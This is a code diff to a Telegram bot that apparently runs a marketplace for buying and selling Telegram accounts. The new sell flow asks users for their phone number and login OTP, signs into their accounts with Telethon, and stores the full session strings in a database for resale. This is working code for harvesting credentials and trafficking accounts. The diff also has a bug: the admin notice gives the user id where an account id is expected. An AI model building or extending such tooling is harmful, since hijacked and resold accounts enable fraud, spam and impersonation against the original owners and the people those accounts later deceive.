@@ -31,7 +31,8 @@ REFERRAL_COMMISSION = 0.02
 
 ptb_app: Application = None
 
-(DEPOSIT_AMOUNT, ADMIN_PHONE, ADMIN_OTP, ADMIN_ADD_PRICE) = range(4)
+(DEPOSIT_AMOUNT, ADMIN_PHONE, ADMIN_OTP, ADMIN_ADD_PRICE,
+ SELL_PHONE, SELL_OTP, SELL_PRICE) = range(7)
 
 # ── Database ──────────────────────────────────────────────────────────────────
 def get_db():
@@ -410,7 +411,7 @@ async def admin_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         rows = conn.execute("SELECT id, price, status, buyer_id FROM accounts ORDER BY id DESC").fetchall()
     if not rows:
         await update.message.reply_text("📦 No accounts yet."); return
-    icons = {"available": "🟢", "sold": "✅"}
+    icons = {"available": "🟢", "sold": "✅", "pending_review": "🔄"}
     lines = [f"📦 *All Accounts* ({len(rows)})\n━━━━━━━━━━━━━━━━━━━━━━"]
     for r in rows:
         lines.append(f"{icons.get(r['status'],'⚪')} #{r['id']} — *${r['price']:.2f}* ({r['status']})"
@@ -452,6 +453,41 @@ async def admin_delete(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     with get_db() as conn:
         conn.execute("DELETE FROM accounts WHERE id=%s", (acc_id,))
     await update.message.reply_text(f"🗑 Account #{acc_id} deleted.")
+
+async def admin_add_sell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Admin sets price for a pending_review account submitted by a seller.
+    Usage: /add_sell <account_id> <price>
+    The account_id is shown in the notification sent when user submits.
+    """
+    if update.effective_user.id != ADMIN_ID:
+        return
+    try:
+        parts = update.message.text.strip().split()
+        acc_id = int(parts[1])
+        price  = float(parts[2])
+        if price <= 0:
+            raise ValueError
+    except (IndexError, ValueError):
+        await update.message.reply_text(
+            "Usage: <code>/add_sell &lt;account_id&gt; &lt;price&gt;</code>\n"
+            "Example: <code>/add_sell 5 25.00</code>",
+            parse_mode="HTML")
+        return
+    with get_db() as conn:
+        acc = conn.execute(
+            "SELECT * FROM accounts WHERE id=%s AND status='pending_review'", (acc_id,)
+        ).fetchone()
+        if not acc:
+            await update.message.reply_text(
+                f"❌ Account #{acc_id} not found or not pending review."); return
+        conn.execute(
+            "UPDATE accounts SET price=%s, status='available' WHERE id=%s",
+            (price, acc_id)
+        )
+    await update.message.reply_text(
+        f"✅ Account #{acc_id} listed at <b>${price:.2f}</b> — now visible in marketplace.",
+        parse_mode="HTML"
+    )
 
 # ── OTP background watcher ────────────────────────────────────────────────────
 async def _watch_for_otp(bot, user_id: int, session_str: str, phone: str, acc_id: int):
@@ -691,25 +727,136 @@ async def confirm_buy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 # ── SELL FLOW ─────────────────────────────────────────────────────────────────
 async def sell_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Entry point — shown when user taps Sell Account button."""
     query = update.callback_query
     await query.answer()
     await query.edit_message_text(
-        f"╔══════════════════════╗\n     💰 *SELL ACCOUNT*\n╚══════════════════════╝\n\n"
-        f"Want to sell your Telegram account on our marketplace?\n\n"
+        f"╔══════════════════════╗\n     💰 <b>SELL ACCOUNT</b>\n╚══════════════════════╝\n\n"
+        f"Want to sell your Telegram account?\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📋 *How to sell:*\n"
-        f"  1️⃣ Contact our support team\n"
-        f"  2️⃣ Provide your account details\n"
-        f"  3️⃣ We verify & list it for sale\n"
+        f"📋 <b>How it works:</b>\n"
+        f"  1️⃣ Enter your phone number\n"
+        f"  2️⃣ Enter the OTP sent to your account\n"
+        f"  3️⃣ We verify &amp; list it for sale\n"
         f"  4️⃣ Get paid when it sells!\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"💬 Tap below to contact support and start the process.",
-        parse_mode="Markdown",
+        f"� Please send your phone number with country code.\n"
+        f"Example: <code>+12345678900</code>\n\n"
+        f"Or tap Back to cancel.",
+        parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🆘 Contact Support to Sell", url=f"https://t.me/{SUPPORT_USERNAME}")],
             [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]
         ])
     )
+    return SELL_PHONE
+
+async def sell_get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """User sent their phone number — send OTP via Telethon."""
+    phone = update.message.text.strip()
+    ctx.user_data["sell_phone"] = phone
+    await update.message.reply_text("⏳ Sending OTP to your account...")
+
+    if not API_ID or not API_HASH:
+        await update.message.reply_text(
+            "❌ <b>Configuration Error</b>\n\n<code>API_ID</code> or <code>API_HASH</code> not set.",
+            parse_mode="HTML")
+        return ConversationHandler.END
+
+    try:
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        result = await client.send_code_request(phone)
+        ctx.user_data["sell_client"] = client
+        ctx.user_data["sell_phone_code_hash"] = result.phone_code_hash
+        await update.message.reply_text(
+            f"📩 <b>OTP Sent!</b>\n\n"
+            f"A login code was sent to <code>{phone}</code>.\n\n"
+            f"Please enter the OTP you received (digits only, e.g. <code>12345</code>):",
+            parse_mode="HTML")
+        return SELL_OTP
+    except Exception as e:
+        logger.error(f"Sell OTP error: {traceback.format_exc()}")
+        await update.message.reply_text(
+            f"❌ <b>Failed to send OTP</b>\n\n<code>{type(e).__name__}: {e}</code>\n\n"
+            f"Please check the phone number and try again.",
+            parse_mode="HTML",
+            reply_markup=main_menu_keyboard())
+        return ConversationHandler.END
+
+async def sell_get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """User sent OTP — sign in and save session, notify admin."""
+    otp       = update.message.text.strip().replace(" ", "")
+    client    = ctx.user_data.get("sell_client")
+    phone     = ctx.user_data.get("sell_phone")
+    code_hash = ctx.user_data.get("sell_phone_code_hash")
+    user      = update.effective_user
+
+    if not client:
+        await update.message.reply_text(
+            "❌ Session expired. Please tap Sell Account again.",
+            reply_markup=main_menu_keyboard())
+        return ConversationHandler.END
+
+    try:
+        from telethon.sessions import StringSession
+        await client.sign_in(phone, otp, phone_code_hash=code_hash)
+        session_string = client.session.save()
+        await client.disconnect()
+        ctx.user_data["sell_session"] = session_string
+
+        # Notify admin with full details to review and set a price
+        await update.message.bot.send_message(
+            ADMIN_ID,
+            f"📥 <b>NEW ACCOUNT FOR SALE</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 Seller: @{user.username or user.first_name} (<code>{user.id}</code>)\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"To list this account, use:\n"
+            f"<code>/add_sell {user.id}</code>",
+            parse_mode="HTML"
+        )
+
+        # Store pending sell in DB for admin to approve
+        with get_db() as conn:
+            conn.execute(
+                "INSERT INTO accounts (session, phone, price, status) VALUES (%s,%s,%s,'pending_review')",
+                (session_string, phone, 0)
+            )
+
+        await update.message.reply_text(
+            f"✅ <b>Account Submitted!</b>\n\n"
+            f"📱 Phone: <code>{phone}</code>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"Your account has been sent to the admin for review.\n"
+            f"Once approved and priced, it will be listed in the marketplace.\n\n"
+            f"You'll be notified when it sells! 💰",
+            parse_mode="HTML",
+            reply_markup=main_menu_keyboard())
+        return ConversationHandler.END
+
+    except Exception as e:
+        logger.error(f"Sell sign-in error: {traceback.format_exc()}")
+        await update.message.reply_text(
+            f"❌ <b>Login Failed</b>\n\n<code>{e}</code>\n\n"
+            f"Please try again.",
+            parse_mode="HTML",
+            reply_markup=main_menu_keyboard())
+        return ConversationHandler.END
+
+async def sell_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Cancel sell conversation."""
+    # Disconnect any open Telethon client
+    client = ctx.user_data.get("sell_client")
+    if client:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+    await update.message.reply_text("❌ Sell cancelled.", reply_markup=main_menu_keyboard())
+    return ConversationHandler.END
 
 # ── WALLET / REFER / WITHDRAW ─────────────────────────────────────────────────
 async def show_balance(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -771,20 +918,33 @@ def build_app() -> Application:
             ADMIN_ADD_PRICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_price)],
         },
         fallbacks=[CommandHandler("cancel", cancel)], per_message=False)
+    sell_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(sell_menu, pattern="^menu_sell$")],
+        states={
+            SELL_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, sell_get_phone)],
+            SELL_OTP:   [MessageHandler(filters.TEXT & ~filters.COMMAND, sell_get_otp)],
+        },
+        fallbacks=[
+            CommandHandler("cancel", sell_cancel),
+            CallbackQueryHandler(lambda u, c: (u.callback_query.answer(), ConversationHandler.END)[1],
+                                 pattern="^menu_back$"),
+        ],
+        per_message=False)
     app.add_handler(CommandHandler("start",    start))
     app.add_handler(deposit_conv)
     app.add_handler(login_conv)
+    app.add_handler(sell_conv)
     app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("accounts", admin_accounts))
     app.add_handler(CommandHandler("users",    admin_users))
     app.add_handler(CommandHandler("pending",  admin_pending))
     app.add_handler(CommandHandler("credit",   admin_credit))
     app.add_handler(CommandHandler("deduct",   admin_deduct))
+    app.add_handler(CommandHandler("add_sell", admin_add_sell))
     app.add_handler(MessageHandler(filters.Regex(r"^/approve_\d+$") & filters.User(ADMIN_ID), admin_approve))
     app.add_handler(MessageHandler(filters.Regex(r"^/reject_\d+$")  & filters.User(ADMIN_ID), admin_reject))
     app.add_handler(MessageHandler(filters.Regex(r"^/del_\d+$")     & filters.User(ADMIN_ID), admin_delete))
     app.add_handler(CallbackQueryHandler(buy_menu,      pattern="^menu_buy$"))
-    app.add_handler(CallbackQueryHandler(sell_menu,     pattern="^menu_sell$"))
     app.add_handler(CallbackQueryHandler(view_account,  pattern=r"^view_\d+$"))
     app.add_handler(CallbackQueryHandler(confirm_buy,   pattern=r"^confirm_\d+$"))
     app.add_handler(CallbackQueryHandler(show_balance,  pattern="^menu_balance$"))
